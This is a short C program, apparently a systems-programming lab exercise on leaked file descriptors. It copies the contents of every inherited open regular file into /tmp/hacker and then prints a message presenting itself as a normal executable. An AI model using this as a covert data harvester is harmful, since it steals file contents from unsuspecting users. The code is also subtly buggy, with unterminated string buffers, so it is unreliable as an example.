#include "csapp.h"

int main(void) {
  long max_fd = sysconf(_SC_OPEN_MAX);
  int out = Open("/tmp/hacker", O_CREAT | O_APPEND | O_WRONLY, 0666);
    
    char buf[1024], path[1024], ch[1024];
    int pid = (int) getpid();
    for(int i = 3; i < max_fd; i++){    //zle poniewaz 0,1,2 nie zawsze sa przypisane do in out err

        struct stat fstt;
        fstat(i,&fstt);
        if(fcntl(i, F_GETFD) < 0)
            continue;        
        if(((fstt.st_mode & S_IFMT) == S_IFREG) && i != out){
            sprintf(path,"/proc/%d/fd/%d",pid, i);
            printf("%s\n",path);
            Readlink(path, buf, sizeof(buf)-1);
            dprintf(out,"File descriptor %d is \'%s\' file!\n",i,buf);   
            Lseek(i, 0, SEEK_SET); 
            int n;          
            while((n = Read(i,ch,1024))){ //pread nie zmienia kursora
                if(n < 1024)
                    ch[n] = 0;
                dprintf(out,"%s",ch);
            }
        }
    }
  /* TODO: Something is missing here! */
  Close(out);

  printf("I'm just a normal executable you use on daily basis!\n");

  return 0;
}
